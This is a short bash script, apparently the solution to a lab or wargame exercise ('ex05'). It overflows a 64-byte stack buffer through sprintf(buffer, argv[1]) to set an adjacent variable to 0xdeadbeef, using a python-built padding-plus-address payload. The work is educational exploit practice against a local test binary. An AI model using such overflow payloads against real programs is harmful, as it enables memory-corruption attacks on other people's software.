#!/usr/bin/env bash
# ex05 — sprintf(buffer, argv[1]) overflow: set target == 0xdeadbeef
# Buffer is 64 bytes; target sits 64 bytes above it on the stack.
# argv[1] cannot contain NUL, so we pass 64 padding + 4 target bytes directly.
# 0xdeadbeef in little-endian = \xef\xbe\xad\xde.

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }

echo "[*] ex05 — overflow target to 0xdeadbeef via sprintf(buf, argv[1])"
echo ""

"$BIN" "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\xef\xbe\xad\xde')")"

echo ""
echo "[*] done."
